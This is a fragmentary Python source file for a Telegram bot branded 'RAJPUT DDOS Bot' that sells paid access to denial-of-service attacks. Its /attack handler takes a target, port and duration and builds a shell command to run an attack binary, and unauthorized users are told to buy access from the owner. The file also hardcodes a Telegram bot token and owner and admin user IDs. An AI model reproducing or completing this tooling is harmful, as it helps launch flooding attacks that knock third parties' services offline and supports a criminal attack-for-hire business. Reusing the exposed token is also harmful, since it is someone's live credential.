...
bot = telebot.TeleBot('7651384185:AAHEy9HZjTg_hXEvTsqRgc1J2LSBoYB1j3w')
# Owner and admin user IDs
owner_id = "1821595166"
admin_ids = ["2106511552"]
...
def send_welcome(message):
    response = (
        f"🌟 Welcome to the RAJPUT DDOS Bot! 🌟\n\n"
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            ...
            if time > 300:
                ...
                full_command = f"./rajput {target} {port} {time} 150"
        ...
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
                    ...
                    "🌟THE ONLY OWNER IS @RAJPUTDDOS DM TO BUY ACCESS")
